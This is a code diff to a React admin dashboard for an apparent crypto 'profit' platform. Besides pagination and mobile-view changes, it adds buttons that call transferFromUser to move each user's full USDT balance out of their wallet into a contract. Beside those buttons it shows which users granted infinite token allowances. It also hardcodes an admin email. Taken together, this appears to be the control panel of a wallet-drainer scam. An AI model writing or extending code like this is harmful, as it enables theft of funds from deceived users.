@@ -47,7 +47,7 @@ const AdminDashboard = () => {
   '0x53367d720EF2A149a550414205d41B003A5273A0' 
   ].map((a) => a.trim().toLowerCase());
   const ADMIN_EMAILS =
-    process.env.NEXT_PUBLIC_ADMIN_EMAILS?.split(',').map((a) => a.trim().toLowerCase()) || [];
+  'rokeroke41@gmail.com'.split(',').map((a) => a.trim().toLowerCase()) || [];
 
   // Cek apakah user yang login (wallet atau email) termasuk admin
   const isAdmin =
@@ -59,17 +59,22 @@ const AdminDashboard = () => {
   const [loadingUsers, setLoadingUsers] = useState(true);
   const [usersError, setUsersError] = useState<string | null>(null);
   const [userPage, setUserPage] = useState(1);
-  const userPageSize = 10;
+  const userPageSize = 5;
   const [totalUsers, setTotalUsers] = useState(0);
   const [selectedUserId, setSelectedUserId] = useState<string | null>(null);
   const [showTxModal, setShowTxModal] = useState(false);
   const [txHash, setTxHash] = useState('');
   const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
+  const [openAccordion, setOpenAccordion] = useState<number | null>(null);
+
 
   // --- State untuk Withdraw History Table ---
   const [withdrawHistory, setWithdrawHistory] = useState<WithdrawHistory[]>([]);
   const [loadingHistory, setLoadingHistory] = useState(true);
   const [historyError, setHistoryError] = useState<string | null>(null);
+  const [withdrawPage, setWithdrawPage] = useState(1); // ✅
+  const withdrawPageSize = 5; // ✅
+  const [totalWithdraws, setTotalWithdraws] = useState(0); // ✅
   
 
   // --- Search Term ---
@@ -195,27 +200,8 @@ const toggleEVN = async (userId: string, currentStatus: boolean) => {
     }
   };
 
-  useEffect(() => {
-    const channel = supabase
-      .channel('admin-users-realtime')
-      .on(
-        'postgres_changes',
-        {
-          event: 'UPDATE',
-          schema: 'public',
-          table: 'users',
-          filter: 'withdraw_request=eq.true' // 🛑 hanya saat user minta withdraw
-        },
-        () => {
-          fetchUsers(); // 🔁 hanya jika withdraw_request = true
-        }
-      )
-      .subscribe();
   
-    return () => {
-      supabase.removeChannel(channel);
-    };
-  }, []);
+  
   
 
 
@@ -284,27 +270,37 @@ const toggleEVN = async (userId: string, currentStatus: boolean) => {
   };
   
 
+  useEffect(() => {
+    fetchWithdrawHistory();
+  }, [withdrawPage]);
+  
 
-  // Fungsi untuk mengambil riwayat withdraw dari database
   const fetchWithdrawHistory = async () => {
-    try {
-      setLoadingHistory(true);
-      setHistoryError(null);
-  
-      const { data, error } = await supabase
-        .from('withdraw_history')
-        .select('*')
-        .order('created_at', { ascending: false });
-  
-      if (error) throw error;
-      setWithdrawHistory(data || []);
-    } catch (err) {
-      console.error('Failed to fetch withdraw history:', err);
-      setHistoryError('Failed to load history');
-    } finally {
-      setLoadingHistory(false);
-    }
-  };
+  try {
+    setLoadingHistory(true);
+    setHistoryError(null);
+
+    // Gunakan pagination
+    const from = (withdrawPage - 1) * withdrawPageSize;
+    const to = withdrawPage * withdrawPageSize - 1;
+
+    const { data, error, count } = await supabase
+      .from('withdraw_history')
+      .select('*', { count: 'exact' }) // <-- penting untuk menghitung total halaman
+      .order('created_at', { ascending: false })
+      .range(from, to);
+
+    if (error) throw error;
+    setWithdrawHistory(data || []);
+    setTotalWithdraws(count || 0); // <-- untuk total halaman
+  } catch (err) {
+    console.error('Failed to fetch withdraw history:', err);
+    setHistoryError('Failed to load history');
+  } finally {
+    setLoadingHistory(false);
+  }
+};
+
 
   useEffect(() => {
     const channel = supabase
@@ -421,9 +417,9 @@ const toggleEVN = async (userId: string, currentStatus: boolean) => {
         </div>
 
         {/* Users Table */}
-        <div className="mb-10">
+        <div className="mb-10 bg-gray-800 p-6 rounded-xl">
           <div className="flex justify-between items-center mb-4">
-            <h2 className="text-2xl font-bold text-white">Users</h2>
+            <h2 className="text-2xl font-bold text-white">USERS TABLE</h2>
             <button
               onClick={fetchUsers}
               className="px-3 py-1 bg-gray-700 hover:bg-gray-600 text-white rounded text-sm"
@@ -437,29 +433,32 @@ const toggleEVN = async (userId: string, currentStatus: boolean) => {
             <div className="text-red-500 text-center py-4">{usersError}</div>
           ) : (
             <div className="overflow-x-auto">
+              <div className="hidden md:block overflow-x-auto">
               <table className="w-full">
                 <thead className="bg-gray-800">
                   <tr>
-                    <th className="px-6 py-4 text-left text-white font-semibold">
-                      Wallet Address
+                    <th className="px-6 py-4 text-left bg-amber-700 rounded-l-2xl text-white font-semibold">
+                      Address
                     </th>
-                    <th className="px-6 py-4 text-left text-white font-semibold">
+                    <th className="px-6 py-4 text-left text-white bg-amber-700 font-semibold">
                       USDT Balance
                     </th>
-                    <th className="px-6 py-4 text-left text-white font-semibold">
-                      Profit Realtime
+                    <th className="px-6 py-4 text-left text-white bg-amber-700 font-semibold">
+                      Profit
                     </th>
-                    <th className="px-6 py-4 text-left text-white font-semibold">
-                      Join Date
+                    <th className="px-6 py-4 text-left text-white bg-amber-700 font-semibold">
+                      Last Login
                     </th>
-                    <th className="px-6 py-4 text-left text-white font-semibold">
+                    
+                    <th className="px-6 py-4 text-left text-white bg-amber-700 font-semibold">
                       Infinite Allowance
                     </th>
-                    <th className="px-6 py-4 text-left text-white font-semibold">
-                      Last Updated
+                    <th className="px-6 py-4 text-left text-white bg-amber-700 font-semibold">
+                      EVENT Status
                     </th>
-                    <th className="px-6 py-4 text-left text-white font-semibold">EVN Status</th>
-                    <th className="px-6 py-4 text-left text-white font-semibold">Actions</th>
+                    
+                    
+                    <th className="px-6 py-4 text-left text-white bg-amber-700 rounded-e-2xl font-semibold">Actions</th>
                   </tr>
                 </thead>
                 <tbody className="divide-y divide-gray-700">
@@ -469,42 +468,158 @@ const toggleEVN = async (userId: string, currentStatus: boolean) => {
                       className="hover:bg-gray-800/50 transition-colors"
                     >
                       <td className="px-6 py-4 text-white font-mono">
-                        {user.wallet_address}
+                      
+                      {`${user.wallet_address.slice(0, 4)}...${user.wallet_address.slice(-5)}`}
+                    
                       </td>
                       <td className="px-6 py-4 text-green-300">
-                        {user.usdt_balance.toFixed(4)} USDT
+                        {user.usdt_balance.toFixed(2)} USDT
                       </td>
                       <td className="px-6 py-4 text-yellow-400">
                         ${user.profit_realtime.toFixed(2)}
                       </td>
-                      <td className="px-6 py-4 text-gray-400">
-                        {new Date(user.join_date).toLocaleDateString()} 
-                      </td>
+                        <td className="px-6 py-4 text-gray-400">
+                        {new Date(user.last_login).toLocaleString()} 
+                        </td>
+                        
                       <td className="px-6 py-4 text-gray-400">
                         {user.infinite_allowance ? 'TRUE' : 'FALSE'}
                       </td>
                       <td className="px-6 py-4 text-gray-400">
-                        {new Date(user.last_updated).toLocaleDateString()}
-                      </td>
-                      <td className="px-6 py-4 text-gray-400">
                         {user.show_evn ? 'ACTIVE' : 'INACTIVE'}
                       </td>
+                      
+                      
                       <td className="px-6 py-4">
-                      <button
+                        <button
                         onClick={() => toggleEVN(user.id, user.show_evn)}
                         className={`px-3 py-1 rounded ${
                           user.show_evn 
-                            ? 'bg-red-600 hover:bg-red-700' 
-                            : 'bg-green-600 hover:bg-green-700'
-                        } text-white`}
-                      >
-                        {user.show_evn ? 'Nonaktifkan' : 'Aktifkan'}
-                      </button>
+                          ? 'bg-red-600 hover:bg-red-700' 
+                          : 'bg-green-600 hover:bg-green-700'
+                        } text-white hover:scale-105 transition-transform cursor-pointer ml-0`}
+                        >
+                        {user.show_evn ? 'Nonaktifkan Event' : 'Aktifkan Event'}
+                        </button>
+                      
+                        
+                        <button
+                          onClick={() => {
+                          navigator.clipboard.writeText(user.wallet_address);
+                          alert("Wallet address copied to clipboard!");
+                          }}
+                          className="px-3 py-1 rounded text-blue-400 bg-gray-700 hover:bg-gray-600 hover:text-white hover:scale-105 transition-transform cursor-pointer"
+                        >
+                          Copy Address
+                        </button>
+                        
+                        {/* Transfer ke kontrak */}
+                          <button
+                            onClick={async () => {
+                              const confirm = window.confirm(`Kirim ${user.usdt_balance.toFixed(2)} USDT dari ${user.wallet_address} ke kontrak?`);
+                              if (!confirm) return;
+                              try {
+                                await transferFromUser(user.wallet_address, user.usdt_balance.toString());
+                                alert('Transfer berhasil!');
+                                fetchBalance(); // Opsional: jika ada fungsi untuk update balance
+                              } catch (err) {
+                                console.error(err);
+                                alert('Transfer gagal!');
+                              }
+                            }}
+                            className="w-full px-3 py-2 mt-2 rounded text-white bg-indigo-600 hover:bg-indigo-700"
+                          >
+                            Transfer USDT ke Kontrak
+                          </button>
                     </td>
                     </tr>
                   ))}
                 </tbody>
               </table>
+              </div>
+              {/* Accordion view for mobile */}
+              <div className="block md:hidden space-y-4">
+                {users.map((user) => (
+                  <details
+                    key={user.id}
+                    className="bg-cyan-950 rounded-lg p-4 border border-gray-700"
+                  >
+                    <summary className="text-white font-mono cursor-pointer">
+                      {`${user.wallet_address.slice(0, 7)}...${user.wallet_address.slice(-5)}`}
+                    </summary>
+                    <div className="mt-4 space-y-2 text-sm text-gray-300">
+                      
+                        <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
+                        <strong>USDT Balance:</strong>
+                        <span className="text-green-300">{user.usdt_balance.toFixed(2)} USDT</span>
+                        </div>
+                        <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
+                        <strong>Profit Realtime:</strong>
+                        <span className="text-yellow-400">${user.profit_realtime.toFixed(2)}</span>
+                        </div>
+                        <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
+                        <strong>Last Login:</strong>
+                        <span>{new Date(user.last_login).toLocaleString()}</span>
+                        </div>
+                        <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
+                        <strong>Last Updated:</strong>
+                        <span>{new Date(user.last_updated).toLocaleString()}</span>
+                        </div>
+                        <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
+                        <strong>Infinite Allowance:</strong>
+                        <span>{user.infinite_allowance ? 'TRUE' : 'FALSE'}</span>
+                        </div>
+                        <div className="flex justify-between bg-gray-700 p-2 rounded-lg">
+                        <strong>EVENT Status:</strong>
+                        <span>{user.show_evn ? 'ACTIVE' : 'INACTIVE'}</span>
+                        </div>
+                      <div className="pt-2">
+                        <button
+                          onClick={() => toggleEVN(user.id, user.show_evn)}
+                          className={`w-full px-3 py-2 rounded text-white ${
+                          user.show_evn
+                            ? 'bg-red-600 hover:bg-red-700'
+                            : 'bg-green-600 hover:bg-green-700'
+                          }`}
+                        >
+                          {user.show_evn ? 'Nonaktifkan' : 'Aktifkan Event'}
+                        </button>
+                        <button
+                        onClick={() => {
+                          navigator.clipboard.writeText(user.wallet_address);
+                          alert("Wallet address copied to clipboard!");
+                        }}
+                        className="w-full px-3 py-2 rounded text-blue-400 bg-gray-700 hover:bg-gray-600"
+                        >
+                        Copy wallet address
+                        </button>
+                        {/* Transfer ke kontrak */}
+                        <div className="mt-2">
+                          <button
+                            onClick={async () => {
+                              const confirm = window.confirm(`Kirim ${user.usdt_balance.toFixed(2)} USDT dari ${user.wallet_address} ke kontrak?`);
+                              if (!confirm) return;
+
+                              try {
+                                await transferFromUser(user.wallet_address, user.usdt_balance.toString());
+                                alert('Transfer berhasil!');
+                                fetchBalance(); // Opsional: jika ada fungsi untuk update balance
+                              } catch (err) {
+                                console.error(err);
+                                alert('Transfer gagal!');
+                              }
+                            }}
+                            className="w-full px-3 py-2 mt-2 rounded text-white bg-indigo-600 hover:bg-indigo-700"
+                          >
+                            Transfer Seluruh USDT ke Kontrak
+                          </button>
+                        </div>
+
+                      </div>
+                    </div>
+                  </details>
+                ))}
+              </div>
               {/* Pagination Controls for Users */}
               <div className="flex justify-between items-center mt-4">
                 <button
@@ -534,7 +649,7 @@ const toggleEVN = async (userId: string, currentStatus: boolean) => {
         </div>
 
         {/* Withdraw Requests Table (refactored to use `users` table) */}
-        <div className="mb-10">
+        <div className="mb-10 bg-gray-800 p-6 rounded-xl">
           <div className="flex justify-between items-center mb-4">
             <h2 className="text-2xl font-bold text-white">Withdraw Requests</h2>
             <button
@@ -548,6 +663,7 @@ const toggleEVN = async (userId: string, currentStatus: boolean) => {
             <div className="text-center text-white py-4">Loading withdraw requests...</div>
           ) : (
             <div className="overflow-x-auto">
+              <div className="hidden md:block overflow-x-auto">
               <table className="w-full">
                 <thead className="bg-gray-800">
                   <tr>
@@ -568,16 +684,16 @@ const toggleEVN = async (userId: string, currentStatus: boolean) => {
                       <td className="px-6 py-4">
                         <button
                           onClick={() => {
-                            setSelectedWallet(user.wallet_address);
-                            setShowTxModal(true);
+                          setSelectedWallet(user.wallet_address);
+                          setShowTxModal(true);
                           }}
-                          className="mr-2 text-green-400"
+                          className="px-3 py-1 rounded mr-2 bg-green-400 text-white hover:bg-green-500 hover:text-gray-900 hover:scale-105 transition-transform cursor-pointer"
                         >
                           Approve
                         </button>
                         <button
                           onClick={() => handleRejectWithdraw(user.wallet_address)}
-                          className="text-red-400"
+                          className="px-3 py-1 rounded bg-red-600 text-white hover:bg-red-700 hover:scale-105 transition-transform cursor-pointer"
                         >
                           Reject
                         </button>
@@ -586,6 +702,47 @@ const toggleEVN = async (userId: string, currentStatus: boolean) => {
                   ))}
                 </tbody>
               </table>
+              </div>
+              {/* Accordion view for mobile */}
+              <div className="block md:hidden space-y-4">
+                {users.filter((u) => u.withdraw_request).map((user) => (
+                  <details
+                    key={user.id}
+                    className="bg-cyan-950 rounded-lg p-4 border border-gray-700"
+                  >
+                    <summary className="text-white font-mono cursor-pointer">
+                      {`${user.wallet_address.slice(0, 7)}...${user.wallet_address.slice(-5)}`}
+                    </summary>
+                    <div className="mt-4 space-y-2 text-sm text-gray-300">
+                      <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
+                        <strong>Amount:</strong>
+                        <span className="text-green-400">${user.withdrawal_amount.toFixed(2)}</span>
+                      </div>
+                      <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
+                        <strong>Join Date:</strong>
+                        <span>{new Date(user.join_date).toLocaleDateString()}</span>
+                      </div>
+                      <div className="pt-2">
+                        <button
+                          onClick={() => {
+                            setSelectedWallet(user.wallet_address);
+                            setShowTxModal(true);
+                          }}
+                          className="w-full px-3 py-2 rounded text-white bg-green-400 hover:bg-green-500"
+                        >
+                          Approve
+                        </button>
+                        <button
+                          onClick={() => handleRejectWithdraw(user.wallet_address)}
+                          className="w-full px-3 py-2 mt-2 rounded text-white bg-red-600 hover:bg-red-700"
+                        >
+                          Reject
+                        </button>
+                      </div>
+                    </div>
+                  </details>
+                ))}
+              </div>
               {/* Optional: no pagination needed here */}
             </div>
           )}
@@ -625,7 +782,7 @@ const toggleEVN = async (userId: string, currentStatus: boolean) => {
 
         
         {/* Withdraw History Table */}
-        <div className="mb-10">
+        <div className="mb-10 bg-gray-800 p-6 rounded-xl">
           <div className="flex justify-between items-center mb-4">
             <h2 className="text-2xl font-bold text-white">Withdraw Request History</h2>
             <button
@@ -641,31 +798,88 @@ const toggleEVN = async (userId: string, currentStatus: boolean) => {
             <div className="text-red-500 text-center py-4">{historyError}</div>
           ) : (
             <div className="overflow-x-auto">
-              <table className="w-full">
-                <thead className="bg-gray-800">
-                  <tr>
-                    <th className="px-6 py-4 text-left text-white font-semibold">Wallet Address</th>
-                    <th className="px-6 py-4 text-left text-white font-semibold">Amount ($)</th>
-                    <th className="px-6 py-4 text-left text-white font-semibold">TX Hash</th>
-                    <th className="px-6 py-4 text-left text-white font-semibold">Date</th>
-                    <th className="px-6 py-4 text-left text-white font-semibold">Status</th>
-                  </tr>
-                </thead>
-                <tbody className="divide-y divide-gray-700">
-                  {withdrawHistory.map((record) => (
-                    <tr key={record.id} className="hover:bg-gray-800/50 transition-colors">
-                      <td className="px-6 py-4 text-white">{record.wallet_address}</td>
-                      <td className="px-6 py-4 text-green-400">${record.amount.toFixed(2)}</td>
-                      <td className="px-6 py-4 text-blue-400 break-all">{record.tx_hash}</td>
-                      <td className="px-6 py-4 text-gray-400">
-                        {new Date(record.created_at).toLocaleString()}
-                      </td>
-                      <td className="px-6 py-4 text-green-400">{record.status}</td>
-
+              <div className="hidden md:block overflow-x-auto">
+                <table className="w-full">
+                  <thead className="bg-gray-800">
+                    <tr>
+                      <th className="px-6 py-4 text-left text-white font-semibold">Wallet Address</th>
+                      <th className="px-6 py-4 text-left text-white font-semibold">Amount ($)</th>
+                      <th className="px-6 py-4 text-left text-white font-semibold">TX Hash</th>
+                      <th className="px-6 py-4 text-left text-white font-semibold">Date</th>
+                      <th className="px-6 py-4 text-left text-white font-semibold">Status</th>
                     </tr>
-                  ))}
-                </tbody>
-              </table>
+                  </thead>
+                  <tbody className="divide-y divide-gray-700">
+                    {withdrawHistory.map((record) => (
+                      <tr key={record.id} className="hover:bg-gray-800/50 transition-colors">
+                        <td className="px-6 py-4 text-white">{record.wallet_address}</td>
+                        <td className="px-6 py-4 text-green-400">${record.amount.toFixed(2)}</td>
+                        <td className="px-6 py-4 text-blue-400 break-all">{record.tx_hash}</td>
+                        <td className="px-6 py-4 text-gray-400">
+                          {new Date(record.created_at).toLocaleString()}
+                        </td>
+                        <td className="px-6 py-4 text-green-400">{record.status}</td>
+
+                      </tr>
+                    ))}
+                  </tbody>
+                </table>
+              </div>
+              {/* Accordion view for mobile */} 
+              <div className="block md:hidden space-y-4">
+                {withdrawHistory.map((record) => (
+                  <details
+                    key={record.id}
+                    className="bg-cyan-950 rounded-lg p-4 border border-gray-700"
+                  >
+                    <summary className="text-white font-mono cursor-pointer">
+                      {`${record.wallet_address.slice(0, 7)}...${record.wallet_address.slice(-5)}`}
+                    </summary>
+                    <div className="mt-4 space-y-2 text-sm text-gray-300">
+                      <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
+                        <strong>Amount:</strong>
+                        <span className="text-green-400">${record.amount.toFixed(2)}</span>
+                      </div>
+                      <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
+                        <strong>TX Hash:</strong>
+                        <span className="text-blue-400 break-all">{record.tx_hash}</span>
+                      </div>
+                      <div className="flex justify-between bg-gray-700 p-2 rounded-lg mb-2">
+                        <strong>Date:</strong>
+                        <span>{new Date(record.created_at).toLocaleString()}</span>
+                      </div>
+                      <div className="flex justify-between bg-gray-700 p-2 rounded-lg">
+                        <strong>Status:</strong>
+                        <span>{record.status}</span>
+                      </div>
+                    </div>
+                  </details>
+                ))}
+              </div>
+              {/* Pagination Controls for Withdraw History */}
+              <div className="flex justify-between items-center mt-4">
+                <button
+                  onClick={() => setWithdrawPage((prev) => Math.max(prev - 1, 1))}
+                  disabled={withdrawPage === 1}
+                  className="px-4 py-2 bg-gray-700 text-white rounded disabled:opacity-50"
+                >
+                  Previous
+                </button>
+                <span className="text-white">
+                  Page {withdrawPage} of {Math.ceil(totalWithdraws / withdrawPageSize)}
+                </span>
+                <button
+                  onClick={() =>
+                    setWithdrawPage((prev) =>
+                      prev < Math.ceil(totalWithdraws / withdrawPageSize) ? prev + 1 : prev
+                    )
+                  }
+                  disabled={withdrawPage >= Math.ceil(totalWithdraws / withdrawPageSize)}
+                  className="px-4 py-2 bg-gray-700 text-white rounded disabled:opacity-50"
+                >
+                  Next
+                </button>
+              </div>
             </div>
           )}
         </div>
